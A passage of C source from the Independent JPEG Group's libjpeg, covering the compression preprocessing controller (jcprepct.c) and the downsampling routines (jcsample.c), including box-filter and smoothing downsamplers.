  if (need_full_buffer) {
#ifdef FULL_MAIN_BUFFER_SUPPORTED
    /* Allocate a full-image virtual array for each component */
    /* Note we pad the bottom to a multiple of the iMCU height */
    for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
	 ci++, compptr++) {
      main->whole_image[ci] = (*cinfo->mem->request_virt_sarray)
	((j_common_ptr) cinfo, JPOOL_IMAGE, FALSE,
	 compptr->width_in_blocks * DCTSIZE,
	 (JDIMENSION) jround_up((long) compptr->height_in_blocks,
				(long) compptr->v_samp_factor) * DCTSIZE,
	 (JDIMENSION) (compptr->v_samp_factor * DCTSIZE));
    }
#else
    ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);
#endif
  } else {
#ifdef FULL_MAIN_BUFFER_SUPPORTED
    main->whole_image[0] = NULL; /* flag for no virtual arrays */
#endif
    /* Allocate a strip buffer for each component */
    for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
	 ci++, compptr++) {
      main->buffer[ci] = (*cinfo->mem->alloc_sarray)
	((j_common_ptr) cinfo, JPOOL_IMAGE,
	 compptr->width_in_blocks * DCTSIZE,
	 (JDIMENSION) (compptr->v_samp_factor * DCTSIZE));
    }
  }
}
/*
 * jcprepct.c
 *
 * Copyright (C) 1994-1996, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains the compression preprocessing controller.
 * This controller manages the color conversion, downsampling,
 * and edge expansion steps.
 *
 * Most of the complexity here is associated with buffering input rows
 * as required by the downsampler.  See the comments at the head of
 * jcsample.c for the downsampler's needs.
 */


/* At present, jcsample.c can request context rows only for smoothing.
 * In the future, we might also need context rows for CCIR601 sampling
 * or other more-complex downsampling procedures.  The code to support
 * context rows should be compiled only if needed.
 */
#ifdef INPUT_SMOOTHING_SUPPORTED
#define CONTEXT_ROWS_SUPPORTED
#endif


/*
 * For the simple (no-context-row) case, we just need to buffer one
 * row group's worth of pixels for the downsampling step.  At the bottom of
 * the image, we pad to a full row group by replicating the last pixel row.
 * The downsampler's last output row is then replicated if needed to pad
 * out to a full iMCU row.
 *
 * When providing context rows, we must buffer three row groups' worth of
 * pixels.  Three row groups are physically allocated, but the row pointer
 * arrays are made five row groups high, with the extra pointers above and
 * below "wrapping around" to point to the last and first real row groups.
 * This allows the downsampler to access the proper context rows.
 * At the top and bottom of the image, we create dummy context rows by
 * copying the first or last real pixel row.  This copying could be avoided
 * by pointer hacking as is done in jdmainct.c, but it doesn't seem worth the
 * trouble on the compression side.
 */


/* Private buffer controller object */

typedef struct {
  struct jpeg_c_prep_controller pub; /* public fields */

  /* Downsampling input buffer.  This buffer holds color-converted data
   * until we have enough to do a downsample step.
   */
  JSAMPARRAY color_buf[MAX_COMPONENTS];

  JDIMENSION rows_to_go;	/* counts rows remaining in source image */
  int next_buf_row;		/* index of next row to store in color_buf */

#ifdef CONTEXT_ROWS_SUPPORTED	/* only needed for context case */
  int this_row_group;		/* starting row index of group to process */
  int next_buf_stop;		/* downsample when we reach this index */
#endif
} my_prep_controller;

typedef my_prep_controller * my_prep_ptr;


/*
 * Initialize for a processing pass.
 */

METHODDEF(void)
start_pass_prep (j_compress_ptr cinfo, J_BUF_MODE pass_mode)
{
  my_prep_ptr prep = (my_prep_ptr) cinfo->prep;

  if (pass_mode != JBUF_PASS_THRU)
    ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);

  /* Initialize total-height counter for detecting bottom of image */
  prep->rows_to_go = cinfo->image_height;
  /* Mark the conversion buffer empty */
  prep->next_buf_row = 0;
#ifdef CONTEXT_ROWS_SUPPORTED
  /* Preset additional state variables for context mode.
   * These aren't used in non-context mode, so we needn't test which mode.
   */
  prep->this_row_group = 0;
  /* Set next_buf_stop to stop after two row groups have been read in. */
  prep->next_buf_stop = 2 * cinfo->max_v_samp_factor;
#endif
}


/*
 * Expand an image vertically from height input_rows to height output_rows,
 * by duplicating the bottom row.
 */

LOCAL(void)
expand_bottom_edge (JSAMPARRAY image_data, JDIMENSION num_cols,
		    int input_rows, int output_rows)
{
  int row;

  for (row = input_rows; row < output_rows; row++) {
    jcopy_sample_rows(image_data, input_rows-1, image_data, row,
		      1, num_cols);
  }
}


/*
 * Process some data in the simple no-context case.
 *
 * Preprocessor output data is counted in "row groups".  A row group
 * is defined to be v_samp_factor sample rows of each component.
 * Downsampling will produce this much data from each max_v_samp_factor
 * input rows.
 */

METHODDEF(void)
pre_process_data (j_compress_ptr cinfo,
		  JSAMPARRAY input_buf, JDIMENSION *in_row_ctr,
		  JDIMENSION in_rows_avail,
		  JSAMPIMAGE output_buf, JDIMENSION *out_row_group_ctr,
		  JDIMENSION out_row_groups_avail)
{
  my_prep_ptr prep = (my_prep_ptr) cinfo->prep;
  int numrows, ci;
  JDIMENSION inrows;
  jpeg_component_info * compptr;

  while (*in_row_ctr < in_rows_avail &&
	 *out_row_group_ctr < out_row_groups_avail) {
    /* Do color conversion to fill the conversion buffer. */
    inrows = in_rows_avail - *in_row_ctr;
    numrows = cinfo->max_v_samp_factor - prep->next_buf_row;
    numrows = (int) MIN((JDIMENSION) numrows, inrows);
    (*cinfo->cconvert->color_convert) (cinfo, input_buf + *in_row_ctr,
				       prep->color_buf,
				       (JDIMENSION) prep->next_buf_row,
				       numrows);
    *in_row_ctr += numrows;
    prep->next_buf_row += numrows;
    prep->rows_to_go -= numrows;
    /* If at bottom of image, pad to fill the conversion buffer. */
    if (prep->rows_to_go == 0 &&
	prep->next_buf_row < cinfo->max_v_samp_factor) {
      for (ci = 0; ci < cinfo->num_components; ci++) {
	expand_bottom_edge(prep->color_buf[ci], cinfo->image_width,
			   prep->next_buf_row, cinfo->max_v_samp_factor);
      }
      prep->next_buf_row = cinfo->max_v_samp_factor;
    }
    /* If we've filled the conversion buffer, empty it. */
    if (prep->next_buf_row == cinfo->max_v_samp_factor) {
      (*cinfo->downsample->downsample) (cinfo,
					prep->color_buf, (JDIMENSION) 0,
					output_buf, *out_row_group_ctr);
      prep->next_buf_row = 0;
      (*out_row_group_ctr)++;
    }
    /* If at bottom of image, pad the output to a full iMCU height.
     * Note we assume the caller is providing a one-iMCU-height output buffer!
     */
    if (prep->rows_to_go == 0 &&
	*out_row_group_ctr < out_row_groups_avail) {
      for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
	   ci++, compptr++) {
	expand_bottom_edge(output_buf[ci],
			   compptr->width_in_blocks * DCTSIZE,
			   (int) (*out_row_group_ctr * compptr->v_samp_factor),
			   (int) (out_row_groups_avail * compptr->v_samp_factor));
      }
      *out_row_group_ctr = out_row_groups_avail;
      break;			/* can exit outer loop without test */
    }
  }
}


#ifdef CONTEXT_ROWS_SUPPORTED

/*
 * Process some data in the context case.
 */

METHODDEF(void)
pre_process_context (j_compress_ptr cinfo,
		     JSAMPARRAY input_buf, JDIMENSION *in_row_ctr,
		     JDIMENSION in_rows_avail,
		     JSAMPIMAGE output_buf, JDIMENSION *out_row_group_ctr,
		     JDIMENSION out_row_groups_avail)
{
  my_prep_ptr prep = (my_prep_ptr) cinfo->prep;
  int numrows, ci;
  int buf_height = cinfo->max_v_samp_factor * 3;
  JDIMENSION inrows;

  while (*out_row_group_ctr < out_row_groups_avail) {
    if (*in_row_ctr < in_rows_avail) {
      /* Do color conversion to fill the conversion buffer. */
      inrows = in_rows_avail - *in_row_ctr;
      numrows = prep->next_buf_stop - prep->next_buf_row;
      numrows = (int) MIN((JDIMENSION) numrows, inrows);
      (*cinfo->cconvert->color_convert) (cinfo, input_buf + *in_row_ctr,
					 prep->color_buf,
					 (JDIMENSION) prep->next_buf_row,
					 numrows);
      /* Pad at top of image, if first time through */
      if (prep->rows_to_go == cinfo->image_height) {
	for (ci = 0; ci < cinfo->num_components; ci++) {
	  int row;
	  for (row = 1; row <= cinfo->max_v_samp_factor; row++) {
	    jcopy_sample_rows(prep->color_buf[ci], 0,
			      prep->color_buf[ci], -row,
			      1, cinfo->image_width);
	  }
	}
      }
      *in_row_ctr += numrows;
      prep->next_buf_row += numrows;
      prep->rows_to_go -= numrows;
    } else {
      /* Return for more data, unless we are at the bottom of the image. */
      if (prep->rows_to_go != 0)
	break;
      /* When at bottom of image, pad to fill the conversion buffer. */
      if (prep->next_buf_row < prep->next_buf_stop) {
	for (ci = 0; ci < cinfo->num_components; ci++) {
	  expand_bottom_edge(prep->color_buf[ci], cinfo->image_width,
			     prep->next_buf_row, prep->next_buf_stop);
	}
	prep->next_buf_row = prep->next_buf_stop;
      }
    }
    /* If we've gotten enough data, downsample a row group. */
    if (prep->next_buf_row == prep->next_buf_stop) {
      (*cinfo->downsample->downsample) (cinfo,
					prep->color_buf,
					(JDIMENSION) prep->this_row_group,
					output_buf, *out_row_group_ctr);
      (*out_row_group_ctr)++;
      /* Advance pointers with wraparound as necessary. */
      prep->this_row_group += cinfo->max_v_samp_factor;
      if (prep->this_row_group >= buf_height)
	prep->this_row_group = 0;
      if (prep->next_buf_row >= buf_height)
	prep->next_buf_row = 0;
      prep->next_buf_stop = prep->next_buf_row + cinfo->max_v_samp_factor;
    }
  }
}


/*
 * Create the wrapped-around downsampling input buffer needed for context mode.
 */

LOCAL(void)
create_context_buffer (j_compress_ptr cinfo)
{
  my_prep_ptr prep = (my_prep_ptr) cinfo->prep;
  int rgroup_height = cinfo->max_v_samp_factor;
  int ci, i;
  jpeg_component_info * compptr;
  JSAMPARRAY true_buffer, fake_buffer;

  /* Grab enough space for fake row pointers for all the components;
   * we need five row groups' worth of pointers for each component.
   */
  fake_buffer = (JSAMPARRAY)
    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
				(cinfo->num_components * 5 * rgroup_height) *
				SIZEOF(JSAMPROW));

  for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
       ci++, compptr++) {
    /* Allocate the actual buffer space (3 row groups) for this component.
     * We make the buffer wide enough to allow the downsampler to edge-expand
     * horizontally within the buffer, if it so chooses.
     */
    true_buffer = (*cinfo->mem->alloc_sarray)
      ((j_common_ptr) cinfo, JPOOL_IMAGE,
       (JDIMENSION) (((long) compptr->width_in_blocks * DCTSIZE *
		      cinfo->max_h_samp_factor) / compptr->h_samp_factor),
       (JDIMENSION) (3 * rgroup_height));
    /* Copy true buffer row pointers into the middle of the fake row array */
    MEMCOPY(fake_buffer + rgroup_height, true_buffer,
	    3 * rgroup_height * SIZEOF(JSAMPROW));
    /* Fill in the above and below wraparound pointers */
    for (i = 0; i < rgroup_height; i++) {
      fake_buffer[i] = true_buffer[2 * rgroup_height + i];
      fake_buffer[4 * rgroup_height + i] = true_buffer[i];
    }
    prep->color_buf[ci] = fake_buffer + rgroup_height;
    fake_buffer += 5 * rgroup_height; /* point to space for next component */
  }
}

#endif /* CONTEXT_ROWS_SUPPORTED */


/*
 * Initialize preprocessing controller.
 */

GLOBAL(void)
jinit_c_prep_controller (j_compress_ptr cinfo, boolean need_full_buffer)
{
  my_prep_ptr prep;
  int ci;
  jpeg_component_info * compptr;

  if (need_full_buffer)		/* safety check */
    ERREXIT(cinfo, JERR_BAD_BUFFER_MODE);

  prep = (my_prep_ptr)
    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
				SIZEOF(my_prep_controller));
  cinfo->prep = (struct jpeg_c_prep_controller *) prep;
  prep->pub.start_pass = start_pass_prep;

  /* Allocate the color conversion buffer.
   * We make the buffer wide enough to allow the downsampler to edge-expand
   * horizontally within the buffer, if it so chooses.
   */
  if (cinfo->downsample->need_context_rows) {
    /* Set up to provide context rows */
#ifdef CONTEXT_ROWS_SUPPORTED
    prep->pub.pre_process_data = pre_process_context;
    create_context_buffer(cinfo);
#else
    ERREXIT(cinfo, JERR_NOT_COMPILED);
#endif
  } else {
    /* No context, just make it tall enough for one row group */
    prep->pub.pre_process_data = pre_process_data;
    for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
	 ci++, compptr++) {
      prep->color_buf[ci] = (*cinfo->mem->alloc_sarray)
	((j_common_ptr) cinfo, JPOOL_IMAGE,
	 (JDIMENSION) (((long) compptr->width_in_blocks * DCTSIZE *
			cinfo->max_h_samp_factor) / compptr->h_samp_factor),
	 (JDIMENSION) cinfo->max_v_samp_factor);
    }
  }
}
/*
 * jcsample.c
 *
 * Copyright (C) 1991-1996, Thomas G. Lane.
 * This file is part of the Independent JPEG Group's software.
 * For conditions of distribution and use, see the accompanying README file.
 *
 * This file contains downsampling routines.
 *
 * Downsampling input data is counted in "row groups".  A row group
 * is defined to be max_v_samp_factor pixel rows of each component,
 * from which the downsampler produces v_samp_factor sample rows.
 * A single row group is processed in each call to the downsampler module.
 *
 * The downsampler is responsible for edge-expansion of its output data
 * to fill an integral number of DCT blocks horizontally.  The source buffer
 * may be modified if it is helpful for this purpose (the source buffer is
 * allocated wide enough to correspond to the desired output width).
 * The caller (the prep controller) is responsible for vertical padding.
 *
 * The downsampler may request "context rows" by setting need_context_rows
 * during startup.  In this case, the input arrays will contain at least
 * one row group's worth of pixels above and below the passed-in data;
 * the caller will create dummy rows at image top and bottom by replicating
 * the first or last real pixel row.
 *
 * An excellent reference for image resampling is
 *   Digital Image Warping, George Wolberg, 1990.
 *   Pub. by IEEE Computer Society Press, Los Alamitos, CA. ISBN 0-8186-8944-7.
 *
 * The downsampling algorithm used here is a simple average of the source
 * pixels covered by the output pixel.  The hi-falutin sampling literature
 * refers to this as a "box filter".  In general the characteristics of a box
 * filter are not very good, but for the specific cases we normally use (1:1
 * and 2:1 ratios) the box is equivalent to a "triangle filter" which is not
 * nearly so bad.  If you intend to use other sampling ratios, you'd be well
 * advised to improve this code.
 *
 * A simple input-smoothing capability is provided.  This is mainly intended
 * for cleaning up color-dithered GIF input files (if you find it inadequate,
 * we suggest using an external filtering program such as pnmconvol).  When
 * enabled, each input pixel P is replaced by a weighted sum of itself and its
 * eight neighbors.  P's weight is 1-8*SF and each neighbor's weight is SF,
 * where SF = (smoothing_factor / 1024).
 * Currently, smoothing is only supported for 2h2v sampling factors.
 */


/* Pointer to routine to downsample a single component */
typedef JMETHOD(void, downsample1_ptr,
		(j_compress_ptr cinfo, jpeg_component_info * compptr,
		 JSAMPARRAY input_data, JSAMPARRAY output_data));

/* Private subobject */

typedef struct {
  struct jpeg_downsampler pub;	/* public fields */

  /* Downsampling method pointers, one per component */
  downsample1_ptr methods[MAX_COMPONENTS];
} my_downsampler;

typedef my_downsampler * my_downsample_ptr;


/*
 * Initialize for a downsampling pass.
 */

METHODDEF(void)
start_pass_downsample (j_compress_ptr cinfo)
{
  /* no work for now */
}


/*
 * Expand a component horizontally from width input_cols to width output_cols,
 * by duplicating the rightmost samples.
 */

LOCAL(void)
expand_right_edge (JSAMPARRAY image_data, int num_rows,
		   JDIMENSION input_cols, JDIMENSION output_cols)
{
  JSAMPROW ptr;
  JSAMPLE pixval;
  int count;
  int row;
  int numcols = (int) (output_cols - input_cols);

  if (numcols > 0) {
    for (row = 0; row < num_rows; row++) {
      ptr = image_data[row] + input_cols;
      pixval = ptr[-1];		/* don't need GETJSAMPLE() here */
      for (count = numcols; count > 0; count--)
	*ptr++ = pixval;
    }
  }
}


/*
 * Do downsampling for a whole row group (all components).
 *
 * In this version we simply downsample each component independently.
 */

METHODDEF(void)
sep_downsample (j_compress_ptr cinfo,
		JSAMPIMAGE input_buf, JDIMENSION in_row_index,
		JSAMPIMAGE output_buf, JDIMENSION out_row_group_index)
{
  my_downsample_ptr downsample = (my_downsample_ptr) cinfo->downsample;
  int ci;
  jpeg_component_info * compptr;
  JSAMPARRAY in_ptr, out_ptr;

  for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
       ci++, compptr++) {
    in_ptr = input_buf[ci] + in_row_index;
    out_ptr = output_buf[ci] + (out_row_group_index * compptr->v_samp_factor);
    (*downsample->methods[ci]) (cinfo, compptr, in_ptr, out_ptr);
  }
}


/*
 * Downsample pixel values of a single component.
 * One row group is processed per call.
 * This version handles arbitrary integral sampling ratios, without smoothing.
 * Note that this version is not actually used for customary sampling ratios.
 */

METHODDEF(void)
int_downsample (j_compress_ptr cinfo, jpeg_component_info * compptr,
		JSAMPARRAY input_data, JSAMPARRAY output_data)
{
  int inrow, outrow, h_expand, v_expand, numpix, numpix2, h, v;
  JDIMENSION outcol, outcol_h;	/* outcol_h == outcol*h_expand */
  JDIMENSION output_cols = compptr->width_in_blocks * DCTSIZE;
  JSAMPROW inptr, outptr;
  INT32 outvalue;

  h_expand = cinfo->max_h_samp_factor / compptr->h_samp_factor;
  v_expand = cinfo->max_v_samp_factor / compptr->v_samp_factor;
  numpix = h_expand * v_expand;
  numpix2 = numpix/2;

  /* Expand input data enough to let all the output samples be generated
   * by the standard loop.  Special-casing padded output would be more
   * efficient.
   */
  expand_right_edge(input_data, cinfo->max_v_samp_factor,
		    cinfo->image_width, output_cols * h_expand);

  inrow = 0;
  for (outrow = 0; outrow < compptr->v_samp_factor; outrow++) {
    outptr = output_data[outrow];
    for (outcol = 0, outcol_h = 0; outcol < output_cols;
	 outcol++, outcol_h += h_expand) {
      outvalue = 0;
      for (v = 0; v < v_expand; v++) {
	inptr = input_data[inrow+v] + outcol_h;
	for (h = 0; h < h_expand; h++) {
	  outvalue += (INT32) GETJSAMPLE(*inptr++);
	}
      }
      *outptr++ = (JSAMPLE) ((outvalue + numpix2) / numpix);
    }
    inrow += v_expand;
  }
}


/*
 * Downsample pixel values of a single component.
 * This version handles the special case of a full-size component,
 * without smoothing.
 */

METHODDEF(void)
fullsize_downsample (j_compress_ptr cinfo, jpeg_component_info * compptr,
		     JSAMPARRAY input_data, JSAMPARRAY output_data)
{
  /* Copy the data */
  jcopy_sample_rows(input_data, 0, output_data, 0,
		    cinfo->max_v_samp_factor, cinfo->image_width);
  /* Edge-expand */
  expand_right_edge(output_data, cinfo->max_v_samp_factor,
		    cinfo->image_width, compptr->width_in_blocks * DCTSIZE);
}


/*
 * Downsample pixel values of a single component.
 * This version handles the common case of 2:1 horizontal and 1:1 vertical,
 * without smoothing.
 *
 * A note about the "bias" calculations: when rounding fractional values to
 * integer, we do not want to always round 0.5 up to the next integer.
 * If we did that, we'd introduce a noticeable bias towards larger values.
 * Instead, this code is arranged so that 0.5 will be rounded up or down at
 * alternate pixel locations (a simple ordered dither pattern).
 */

METHODDEF(void)
h2v1_downsample (j_compress_ptr cinfo, jpeg_component_info * compptr,
		 JSAMPARRAY input_data, JSAMPARRAY output_data)
{
  int outrow;
  JDIMENSION outcol;
  JDIMENSION output_cols = compptr->width_in_blocks * DCTSIZE;
  JSAMPROW inptr, outptr;
  int bias;

  /* Expand input data enough to let all the output samples be generated
   * by the standard loop.  Special-casing padded output would be more
   * efficient.
   */
  expand_right_edge(input_data, cinfo->max_v_samp_factor,
		    cinfo->image_width, output_cols * 2);

  for (outrow = 0; outrow < compptr->v_samp_factor; outrow++) {
    outptr = output_data[outrow];
    inptr = input_data[outrow];
    bias = 0;			/* bias = 0,1,0,1,... for successive samples */
    for (outcol = 0; outcol < output_cols; outcol++) {
      *outptr++ = (JSAMPLE) ((GETJSAMPLE(*inptr) + GETJSAMPLE(inptr[1])
			      + bias) >> 1);
      bias ^= 1;		/* 0=>1, 1=>0 */
      inptr += 2;
    }
  }
}


/*
 * Downsample pixel values of a single component.
 * This version handles the standard case of 2:1 horizontal and 2:1 vertical,
 * without smoothing.
 */

METHODDEF(void)
h2v2_downsample (j_compress_ptr cinfo, jpeg_component_info * compptr,
		 JSAMPARRAY input_data, JSAMPARRAY output_data)
{
  int inrow, outrow;
  JDIMENSION outcol;
  JDIMENSION output_cols = compptr->width_in_blocks * DCTSIZE;
  JSAMPROW inptr0, inptr1, outptr;
  int bias;

  /* Expand input data enough to let all the output samples be generated
   * by the standard loop.  Special-casing padded output would be more
   * efficient.
   */
  expand_right_edge(input_data, cinfo->max_v_samp_factor,
		    cinfo->image_width, output_cols * 2);

  inrow = 0;
  for (outrow = 0; outrow < compptr->v_samp_factor; outrow++) {
    outptr = output_data[outrow];
    inptr0 = input_data[inrow];
    inptr1 = input_data[inrow+1];
    bias = 1;			/* bias = 1,2,1,2,... for successive samples */
    for (outcol = 0; outcol < output_cols; outcol++) {
      *outptr++ = (JSAMPLE) ((GETJSAMPLE(*inptr0) + GETJSAMPLE(inptr0[1]) +
			      GETJSAMPLE(*inptr1) + GETJSAMPLE(inptr1[1])
			      + bias) >> 2);
      bias ^= 3;		/* 1=>2, 2=>1 */
      inptr0 += 2; inptr1 += 2;
    }
    inrow += 2;
  }
}


#ifdef INPUT_SMOOTHING_SUPPORTED

/*
 * Downsample pixel values of a single component.
 * This version handles the standard case of 2:1 horizontal and 2:1 vertical,
 * with smoothing.  One row of context is required.
 */

METHODDEF(void)
h2v2_smooth_downsample (j_compress_ptr cinfo, jpeg_component_info * compptr,
			JSAMPARRAY input_data, JSAMPARRAY output_data)
{
  int inrow, outrow;
  JDIMENSION colctr;
  JDIMENSION output_cols = compptr->width_in_blocks * DCTSIZE;
  JSAMPROW inptr0, inptr1, above_ptr, below_ptr, outptr;
  INT32 membersum, neighsum, memberscale, neighscale;

  /* Expand input data enough to let all the output samples be generated
   * by the standard loop.  Special-casing padded output would be more
   * efficient.
   */
  expand_right_edge(input_data - 1, cinfo->max_v_samp_factor + 2,
		    cinfo->image_width, output_cols * 2);

  /* We don't bother to form the individual "smoothed" input pixel values;
   * we can directly compute the output which is the average of the four
   * smoothed values.  Each of the four member pixels contributes a fraction
   * (1-8*SF) to its own smoothed image and a fraction SF to each of the three
   * other smoothed pixels, therefore a total fraction (1-5*SF)/4 to the final
   * output.  The four corner-adjacent neighbor pixels contribute a fraction
   * SF to just one smoothed pixel, or SF/4 to the final output; while the
   * eight edge-adjacent neighbors contribute SF to each of two smoothed
   * pixels, or SF/2 overall.  In order to use integer arithmetic, these
   * factors are scaled by 2^16 = 65536.
   * Also recall that SF = smoothing_factor / 1024.
   */

  memberscale = 16384 - cinfo->smoothing_factor * 80; /* scaled (1-5*SF)/4 */
  neighscale = cinfo->smoothing_factor * 16; /* scaled SF/4 */

  inrow = 0;
  for (outrow = 0; outrow < compptr->v_samp_factor; outrow++) {
    outptr = output_data[outrow];
    inptr0 = input_data[inrow];
    inptr1 = input_data[inrow+1];
    above_ptr = input_data[inrow-1];
    below_ptr = input_data[inrow+2];

    /* Special case for first column: pretend column -1 is same as column 0 */
    membersum = GETJSAMPLE(*inptr0) + GETJSAMPLE(inptr0[1]) +
		GETJSAMPLE(*inptr1) + GETJSAMPLE(inptr1[1]);
    neighsum = GETJSAMPLE(*above_ptr) + GETJSAMPLE(above_ptr[1]) +
	       GETJSAMPLE(*below_ptr) + GETJSAMPLE(below_ptr[1]) +
	       GETJSAMPLE(*inptr0) + GETJSAMPLE(inptr0[2]) +
	       GETJSAMPLE(*inptr1) + GETJSAMPLE(inptr1[2]);
    neighsum += neighsum;
    neighsum += GETJSAMPLE(*above_ptr) + GETJSAMPLE(above_ptr[2]) +
		GETJSAMPLE(*below_ptr) + GETJSAMPLE(below_ptr[2]);
    membersum = membersum * memberscale + neighsum * neighscale;
    *outptr++ = (JSAMPLE) ((membersum + 32768) >> 16);
    inptr0 += 2; inptr1 += 2; above_ptr += 2; below_ptr += 2;

    for (colctr = output_cols - 2; colctr > 0; colctr--) {
      /* sum of pixels directly mapped to this output element */
      membersum = GETJSAMPLE(*inptr0) + GETJSAMPLE(inptr0[1]) +
		  GETJSAMPLE(*inptr1) + GETJSAMPLE(inptr1[1]);
      /* sum of edge-neighbor pixels */
      neighsum = GETJSAMPLE(*above_ptr) + GETJSAMPLE(above_ptr[1]) +
		 GETJSAMPLE(*below_ptr) + GETJSAMPLE(below_ptr[1]) +
		 GETJSAMPLE(inptr0[-1]) + GETJSAMPLE(inptr0[2]) +
		 GETJSAMPLE(inptr1[-1]) + GETJSAMPLE(inptr1[2]);
      /* The edge-neighbors count twice as much as corner-neighbors */
      neighsum += neighsum;
      /* Add in the corner-neighbors */
      neighsum += GETJSAMPLE(above_ptr[-1]) + GETJSAMPLE(above_ptr[2]) +
		  GETJSAMPLE(below_ptr[-1]) + GETJSAMPLE(below_ptr[2]);
      /* form final output scaled up by 2^16 */
      membersum = membersum * memberscale + neighsum * neighscale;
      /* round, descale and output it */
      *outptr++ = (JSAMPLE) ((membersum + 32768) >> 16);
      inptr0 += 2; inptr1 += 2; above_ptr += 2; below_ptr += 2;
    }

    /* Special case for last column */
    membersum = GETJSAMPLE(*inptr0) + GETJSAMPLE(inptr0[1]) +
		GETJSAMPLE(*inptr1) + GETJSAMPLE(inptr1[1]);
    neighsum = GETJSAMPLE(*above_ptr) + GETJSAMPLE(above_ptr[1]) +
	       GETJSAMPLE(*below_ptr) + GETJSAMPLE(below_ptr[1]) +
	       GETJSAMPLE(inptr0[-1]) + GETJSAMPLE(inptr0[1]) +
	       GETJSAMPLE(inptr1[-1]) + GETJSAMPLE(inptr1[1]);
    neighsum += neighsum;
    neighsum += GETJSAMPLE(above_ptr[-1]) + GETJSAMPLE(above_ptr[1]) +
		GETJSAMPLE(below_ptr[-1]) + GETJSAMPLE(below_ptr[1]);
    membersum = membersum * memberscale + neighsum * neighscale;
    *outptr = (JSAMPLE) ((membersum + 32768) >> 16);

    inrow += 2;
  }
}


/*
 * Downsample pixel values of a single component.
 * This version handles the special case of a full-size component,
 * with smoothing.  One row of context is required.
 */

METHODDEF(void)
fullsize_smooth_downsample (j_compress_ptr cinfo, jpeg_component_info *compptr,
			    JSAMPARRAY input_data, JSAMPARRAY output_data)
{
  int outrow;
  JDIMENSION colctr;
  JDIMENSION output_cols = compptr->width_in_blocks * DCTSIZE;
  JSAMPROW inptr, above_ptr, below_ptr, outptr;
  INT32 membersum, neighsum, memberscale, neighscale;
  int colsum, lastcolsum, nextcolsum;

  /* Expand input data enough to let all the output samples be generated
   * by the standard loop.  Special-casing padded output would be more
   * efficient.
   */
  expand_right_edge(input_data - 1, cinfo->max_v_samp_factor + 2,
		    cinfo->image_width, output_cols);

  /* Each of the eight neighbor pixels contributes a fraction SF to the
   * smoothed pixel, while the main pixel contributes (1-8*SF).  In order
   * to use integer arithmetic, these factors are multiplied by 2^16 = 65536.
   * Also recall that SF = smoothing_factor / 1024.
   */

  memberscale = 65536L - cinfo->smoothing_factor * 512L; /* scaled 1-8*SF */
  neighscale = cinfo->smoothing_factor * 64; /* scaled SF */

  for (outrow = 0; outrow < compptr->v_samp_factor; outrow++) {
    outptr = output_data[outrow];
    inptr = input_data[outrow];
    above_ptr = input_data[outrow-1];
    below_ptr = input_data[outrow+1];

    /* Special case for first column */
    colsum = GETJSAMPLE(*above_ptr++) + GETJSAMPLE(*below_ptr++) +
	     GETJSAMPLE(*inptr);
    membersum = GETJSAMPLE(*inptr++);
    nextcolsum = GETJSAMPLE(*above_ptr) + GETJSAMPLE(*below_ptr) +
		 GETJSAMPLE(*inptr);
    neighsum = colsum + (colsum - membersum) + nextcolsum;
    membersum = membersum * memberscale + neighsum * neighscale;
    *outptr++ = (JSAMPLE) ((membersum + 32768) >> 16);
    lastcolsum = colsum; colsum = nextcolsum;

    for (colctr = output_cols - 2; colctr > 0; colctr--) {
      membersum = GETJSAMPLE(*inptr++);
      above_ptr++; below_ptr++;
      nextcolsum = GETJSAMPLE(*above_ptr) + GETJSAMPLE(*below_ptr) +
		   GETJSAMPLE(*inptr);
      neighsum = lastcolsum + (colsum - membersum) + nextcolsum;
      membersum = membersum * memberscale + neighsum * neighscale;
      *outptr++ = (JSAMPLE) ((membersum + 32768) >> 16);
      lastcolsum = colsum; colsum = nextcolsum;
    }

    /* Special case for last column */
    membersum = GETJSAMPLE(*inptr);
    neighsum = lastcolsum + (colsum - membersum) + colsum;
    membersum = membersum * memberscale + neighsum * neighscale;
    *outptr = (JSAMPLE) ((membersum + 32768) >> 16);

  }
}

#endif /* INPUT_SMOOTHING_SUPPORTED */


/*
 * Module initialization routine for downsampling.
 * Note that we must select a routine for each component.
 */

GLOBAL(void)
jinit_downsampler (j_compress_ptr cinfo)
{
  my_downsample_ptr downsample;
  int ci;
  jpeg_component_info * compptr;
  boolean smoothok = TRUE;

  downsample = (my_downsample_ptr)
    (*cinfo->mem->alloc_small) ((j_common_ptr) cinfo, JPOOL_IMAGE,
				SIZEOF(my_downsampler));
  cinfo->downsample = (struct jpeg_downsampler *) downsample;
  downsample->pub.start_pass = start_pass_downsample;
  downsample->pub.downsample = sep_downsample;
  downsample->pub.need_context_rows = FALSE;

  if (cinfo->CCIR601_sampling)
    ERREXIT(cinfo, JERR_CCIR601_NOTIMPL);

  /* Verify we can handle the sampling factors, and set up method pointers */
  for (ci = 0, compptr = cinfo->comp_info; ci < cinfo->num_components;
       ci++, compptr++) {
    if (compptr->h_samp_factor == cinfo->max_h_samp_factor &&
	compptr->v_samp_factor == cinfo->max_v_samp_factor) {
#ifdef INPUT_SMOOTHING_SUPPORTED
      if (cinfo->smoothing_factor) {
	downsample->methods[ci] = fullsize_smooth_downsample;
	downsample->pub.need_context_rows = TRUE;
      } else
#endif
	downsample->methods[ci] = fullsize_downsample;
    } else if (compptr->h_samp_factor * 2 == cinfo->max_h_samp_factor &&
	       compptr->v_samp_factor == cinfo->max_v_samp_factor) {
      smoothok = FALSE;
      downsample->methods[ci] = h2v1_downsample;
    } else if (compptr->h_samp_factor * 2 == cinfo->max_h_samp_factor &&
	       compptr->v_samp_factor * 2 == cinfo->max_v_samp_factor) {
#ifdef INPUT_SMOOTHING_SUPPORTED
      if (cinfo->smoothing_factor) {
	downsample->methods[ci] = h2v2_smooth_downsample;
	downsample->pub.need_context_rows = TRUE;
      } else
#endif
	downsample->methods[ci] = h2v2_downsample;
